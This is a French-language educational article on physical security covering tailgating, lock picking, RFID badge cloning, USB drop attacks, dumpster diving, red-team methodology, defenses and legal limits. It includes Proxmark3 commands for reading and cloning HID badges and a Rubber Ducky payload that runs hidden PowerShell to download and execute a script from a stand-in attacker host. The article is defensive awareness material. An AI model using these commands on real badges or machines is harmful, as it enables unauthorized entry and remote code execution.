# Sécurité physique : quand les hackers passent la porte

La cybersécurité ne se limite pas aux écrans et aux réseaux. La **sécurité physique** est souvent le maillon faible d'une organisation — un attaquant qui entre physiquement dans vos locaux peut contourner en quelques minutes toutes vos défenses numériques.

## Pourquoi la sécurité physique est critique

```
Statistique choc :
Un attaquant qui branche une clé USB malveillante sur un poste
→ Accès au réseau interne en < 60 secondes
→ Contourne firewall, antivirus, VPN
→ Bypasse toute l'infrastructure de sécurité réseau

Kevin Mitnick (l'un des hackers les plus célèbres) :
"La sécurité physique est la mère de toutes les sécurités.
Si quelqu'un peut toucher votre matériel, il peut le compromettre."
```

## Techniques d'intrusion physique

### Tailgating et Piggybacking

```
Tailgating :
Suivre discrètement un employé autorisé dans une zone sécurisée
→ L'employé badge → La porte s'ouvre → L'attaquant entre derrière

Piggybacking :
Avec la complicité (involontaire) d'un employé
→ "Vous pouvez me tenir la porte ? J'ai les mains chargées"
→ Uniforme de livreur, technicien, agent de nettoyage

Statistiques :
→ 74% des employés tiennent la porte à quelqu'un sans badge
→ Un uniforme de livreur Amazon = accès quasi garanti
```

### Lock Picking — Crochetage de serrures

```bash
# Types de serrures et leur résistance

Serrures à gorges (anciennes) :
→ Crochetage facile en 30 secondes
→ Outils : crochet + tension wrench
→ Résistance : très faible

Serrures à cylindre européen :
→ Plus résistantes
→ Techniques : single pin picking, raking
→ Temps moyen expert : 2-5 minutes

Serrures Abloy (disques rotatifs) :
→ Très résistantes au crochetage
→ Nécessitent des outils spécialisés
→ Recommandées pour les zones sensibles

Serrures électroniques à badge :
→ Résistantes au crochetage physique
→ MAIS vulnérables au clonage RFID (voir section suivante)

# Outils de lock picking légaux (pour formation)
→ Kit Peterson
→ Multipick
→ Sparrows
# Note : posséder ces outils sans raison légitime peut être illégal
```

### Clonage de badges RFID

```python
# Les badges d'accès RFID 125kHz (HID, EM4100) sont facilement clonables

# Matériel nécessaire :
# Proxmark3 (300-500€) ou lecteur EM4100 (~15€ sur AliExpress)
# Carte vierge T5577 (~1€)

# Lire un badge depuis 10-20cm (dans la poche !)
pm3 --> lf hid read
# Résultat : [+] HID Prox ID: 2004263f5c

# Cloner sur une carte vierge
pm3 --> lf hid clone -r 2004263f5c

# L'attaquant peut cloner votre badge sans jamais vous toucher
# Dans le métro, dans un ascenseur, dans une file d'attente

# Protection :
# → Utiliser des badges MIFARE DESFire (chiffrement AES-128)
# → Étuis RFID-blocking pour les badges
# → Implémenter un second facteur (badge + PIN)
```

### USB Drop Attack

```
Scénario classique :
1. L'attaquant dépose des clés USB dans le parking
2. Employé curieux la branche sur son poste
3. Exécution automatique du payload
4. Reverse shell vers l'attaquant

Types de périphériques malveillants :
→ USB Rubber Ducky : simule un clavier, tape des commandes
→ O.MG Cable : câble USB Lightning/USB-C avec WiFi intégré
→ LAN Turtle : crée un tunnel réseau via USB
→ Bash Bunny : couteau suisse des attaques USB

# Rubber Ducky payload exemple (DuckyScript)
DELAY 1000
GUI r                    # Windows + R
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attaquant.com/payload.ps1')"
ENTER

# Exécuté en < 3 secondes après branchement
```

### Dumpster Diving

```
Fouiller les poubelles d'une entreprise peut révéler :
→ Documents avec mots de passe écrits
→ Organigrammes (cibles pour le spear phishing)
→ Anciens disques durs non effacés
→ Badges expirés (pour analyser le format)
→ Notes post-it avec credentials
→ Relevés bancaires, contrats

Statistique : 40% des entreprises jettent des documents
sensibles sans les détruire

Protection :
→ Destructeur de documents (coupe croisée minimum)
→ Effacement sécurisé des disques (DBAN, dd /dev/zero)
→ Politique de destruction des supports
```

## Red Team physique — Méthodologie

```
Phase 1 : Reconnaissance externe
→ Google Maps / Street View du bâtiment
→ LinkedIn pour identifier les employés (uniforme, badges visibles)
→ Horaires d'entrée/sortie (observation)
→ Prestataires réguliers (sécurité, nettoyage, IT)

Phase 2 : Prétexting (légende)
→ Créer une identité crédible
→ Technicien informatique → "Je viens faire la maintenance du serveur"
→ Auditeur → "Je suis mandaté par la direction pour un audit"
→ Livreur → Uniforme + colis factice

Phase 3 : Intrusion
→ Tailgating derrière un employé
→ Exploiter une entrée secondaire moins surveillée
→ Heure de pointe (9h-9h30) = flux important = moins de vigilance

Phase 4 : Actions sur objectif
→ Brancher un implant réseau (LAN Turtle, Raspberry Pi)
→ Cloner des badges
→ Photographier des informations sensibles
→ Accéder à un poste déverrouillé

Phase 5 : Exfiltration
→ Sortir discrètement
→ Rapport détaillé pour l'organisation cliente
```

## Mesures de protection

```
Contrôle d'accès physique :
✅ Sas d'entrée (mantrap) : une seule personne à la fois
✅ Badges avec photo + chiffrement (MIFARE DESFire)
✅ Caméras à toutes les entrées avec enregistrement 30 jours
✅ Réceptionniste formé à vérifier les identités
✅ Procédure visiteurs : escorte obligatoire dans les locaux
✅ Zones de sécurité (zones vertes/oranges/rouges)

Matériel :
✅ Câble Kensington sur les laptops
✅ Clean desk policy (pas de documents sensibles visibles)
✅ Écrans de confidentialité (privacy screen)
✅ Verrouillage automatique des postes après 5 minutes
✅ Désactivation des ports USB sur les postes sensibles
✅ Destruction sécurisée des documents et supports

Formation :
✅ Sensibilisation au tailgating (ne pas laisser entrer sans badge)
✅ Politique "si vous ne reconnaissez pas quelqu'un, demandez"
✅ Signalement des comportements suspects
✅ Test régulier par des pentesters physiques
```

## Test de pénétration physique — Cadre légal

```
⚠️ IMPORTANT : Tout test physique DOIT être autorisé par écrit

Avant un Red Team physique :
→ Contrat signé avec périmètre défini
→ Lettre d'autorisation signée par la direction
→ Numéro d'urgence si vous êtes intercepté
→ Coordination avec la sécurité interne (si nécessaire)

Sans autorisation écrite :
→ Intrusion dans un bâtiment = délit
→ Clonage de badge = violation de données
→ Branchement d'équipements = accès frauduleux à un STAD
→ Peines : jusqu'à 5 ans de prison et 150 000€ d'amende

La règle d'or : "Get out of jail free card"
→ Document signé par le RSSI/DG attestant l'autorisation
→ À présenter si vous êtes arrêté par la sécurité ou la police
```

## Conclusion

La sécurité physique est souvent négligée au profit de la cybersécurité technique. Pourtant, **un badge cloné ou une clé USB abandonnée peuvent compromettre une organisation entière en quelques minutes**. Une vraie posture de sécurité combine défenses numériques ET physiques : contrôle d'accès strict, formation des employés au tailgating et tests d'intrusion physique réguliers.

---
*Catégorie : Sécurité physique*
